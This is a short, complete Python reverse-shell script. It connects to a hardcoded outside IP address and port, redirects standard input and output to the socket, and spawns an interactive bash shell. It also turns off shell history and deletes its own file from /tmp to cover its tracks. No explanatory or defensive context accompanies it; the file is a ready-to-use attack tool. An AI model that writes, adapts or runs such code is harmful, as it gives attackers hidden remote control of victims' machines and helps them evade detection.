#!/usr/bin/env python
# -*- coding:utf8 -*-
import os
import pty
import socket

lhost = "119.29.87.226" # XXX: CHANGEME
lport = 31337 # XXX: CHANGEME

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    os.remove('/tmp/.1.py')   # 销毁自身
    s.close()
    
if __name__ == "__main__":
    main()

